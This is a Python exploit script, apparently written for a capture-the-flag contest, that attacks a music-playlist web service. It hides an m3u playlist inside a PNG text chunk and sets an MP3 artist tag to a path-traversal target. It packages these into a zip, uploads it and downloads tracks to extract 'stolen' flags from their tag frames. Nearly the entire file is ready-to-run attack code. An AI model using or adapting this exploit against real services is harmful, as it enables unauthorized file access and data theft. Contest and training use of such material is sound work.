import os.path
import shutil
import eyed3
import uuid
import sys
import traceback
import contextlib
import eyed3.plugins
from api import Api
from PIL import Image
from PIL.PngImagePlugin import PngInfo


@contextlib.contextmanager
def unpack():
    dirr = str(uuid.uuid4())
    os.mkdir(dirr)
    try:
        yield f"{dirr}"
    except Exception as e:
        print(e, traceback.format_exc(), file=sys.stderr)
    finally:
        shutil.rmtree(dirr)


def create_track_fix(track_name, image_path, artist):
    shutil.copy("proto_track.mp3", track_name)
    mp3file = eyed3.load(track_name)

    if mp3file.tag is None:
        mp3file.initTag()

    with open(image_path, 'rb') as img:
        img_bytes = img.read()

    mp3file.tag.album = "."
    mp3file.tag.artist = artist
    mp3file.tag.title = "."
    mp3file.tag.images.set(3, img_bytes, 'image/png')
    mp3file.tag.save()


def patch_image():  # <- image with a text inside can be loaded as a playlist
    with open("proto_image.png", mode="rb") as i:
        img = Image.open(i)

        info = PngInfo()

        with open("attacking_playlist.m3u") as pl:
            text = pl.read()

        info.add_text("attack", text)
        img.save("vuln_image.png", "PNG", pnginfo=info)


def create_playlist_file(path_for_playlist):

    playlist_dir = "sploit"
    patch_image()

    os.mkdir(str(playlist_dir))

    create_track_fix(f"{playlist_dir}/track1.mp3", "vuln_image.png", path_for_playlist)
    shutil.copy("proto_playlist.m3u", f"{playlist_dir}/playlist.m3u")
    shutil.make_archive(f"{playlist_dir}", "zip", str(playlist_dir))
    shutil.rmtree(str(playlist_dir))


async def run_sploit(target="127.0.0.1"):
    pl_id = "e915797d-fba2-4b51-aa46-30df6810b387"
    create_playlist_file(f"/storage/playlists/{pl_id}.m3u") # <- path traversal
    async with Api(target) as api:
        await api.upload_playlist("sploit.zip")
        print(f"Uploaded sploit...")
        results = []
        for i in range(16):
            results.append(await api.download_music(pl_id, i))
            print(f"Downloading... {i}")

    flags = {}
    with unpack() as session:
        for num, music in enumerate(results):
            with open(f"{session}/stolen_{num}.mp3", mode="wb") as mus:
                mus.write(music)

            try:
                music = eyed3.load(f"{session}/stolen_{num}.mp3")
                flags[num] = music.tag.frame_set[b"TXXX"][0].data.split(b"\x00")[1].decode()
            except:
                pass

    print(f"Look at we've got stolen! {flags}")

if __name__ == '__main__':
    import asyncio
    asyncio.run(run_sploit())

# to get all flags u need to make more playlists with different sha1 endings
